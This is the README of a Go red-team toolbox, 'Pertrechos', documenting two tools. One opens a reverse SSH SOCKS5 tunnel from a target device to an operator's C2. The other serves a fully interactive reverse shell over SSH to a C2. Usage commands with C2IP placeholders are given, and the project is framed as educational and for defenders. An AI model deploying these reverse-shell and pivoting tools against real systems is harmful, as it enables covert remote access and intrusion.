Pertrechos
===========================

*petrechos: Red Team Tool Set*


+----------------+--------------------------------------------------+
|Project site    |https://github.com/rebujacker/Pertrechos           |
+----------------+--------------------------------------------------+
|Issues          |https://github.com/rebujacker/Pertrechos/issues/   |
+----------------+--------------------------------------------------+
|Author          |Alvaro Folgado (rebujacker)                        |
+----------------+--------------------------------------------------+
|Documentation   |https://github.com/rebujacker/Pertrechos/README.rst|
+----------------+--------------------------------------------------+
|Last Version    |Beta                                               |
+----------------+--------------------------------------------------+
|Golang versions |1.10.3 or above                                    |
+----------------+--------------------------------------------------+

What is Pertrechos? What is its Purpose?
===================================================

Pertrechos is a toolbox repo. that will contain simple code-snippets in go to perform different useful actions to help offSec. operations/projects.

For the moment, they will be simple extracts of features that SiestaTime framework has already in place, but with the freedom of a simple binary or source ready to be used.

Each tool will normally focus in one type of feature and should work for three platforms: Linux,Windows and OSX

This tool has both **Educational Purposes** and aims to help **security industry** and **defenders**.


Butron - Reverse SSH SOCKS5
===================================

Open a SOCKS5 in a target SSH server, by using a reverse SSH connection from the device.
Basically like doing "ssh -i key.pem -D user@<ImplantSSHServer>" from our C2. 

If you want to test the functionality, use a browser (EG. Mozilla) and set a SOCKS5 proxy towards your C2 SOCKS5 opened.


Compile and Use:

petrechos.sh butron <windows/darwin/linux> <amd64/386>
./butron <key.pem> <SSHuser> <C2IP:Port> <IPtoListen:Port> <OptionalParamLog>

Rememeber that your C2 sshd needs to have "GatewayPorts yes" in /etc/ssh/sshd.conf to be able to listen to 0.0.0.0


Sources Used:
https://labs.portcullis.co.uk/blog/reverse-port-forwarding-socks-proxy-via-http-proxy-part-1/
https://github.com/armon/go-socks5
https://gist.github.com/codref/473351a24a3ef90162cf10857fac0ff3

Falcata - Reverse SSH Full Interactive Terminal (Linux,Darwin, TBD Windows)
===========================================================================================

Full Interactive shell. The "Egress" will connect using SSH to target C2, and serve a full interactve shell in a listener.
The "Connect" will take care of terminal channels/etc... to have a full interactive session. 

<TBD> Full Interactive mirror for windows.

Compile and Use:

petrechos.sh falcata <windows/darwin/linux> <amd64/386>
./falcata egress <key.pem> <SSHuser> <C2IP:Port> <IPtoListen:Port>
./falcata connect <IPtoListen:Port>

Sources Used:
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
https://dev.to/napicella/linux-terminals-tty-pty-and-shell-part-2-2cb2
https://gist.github.com/napicella/777e83c0ef5b77bf72c0a5d5da9a4b4e

Contributing
=============================

Any collaboration is welcome! Feel free to contact me.

There are many tasks to do. You can check the `Issues <https://github.com/rebujacker/Pertrechos/issues/ >`_ and send us a Pull Request.


Disclaimer
===================================

Author/Contributors will not be responsible for the malfunctioning or weaponization of this code

License
========================

This project is distributed under `GPL V3 license <https://github.com/rebujacker/Pertrechos/LICENSE>`_
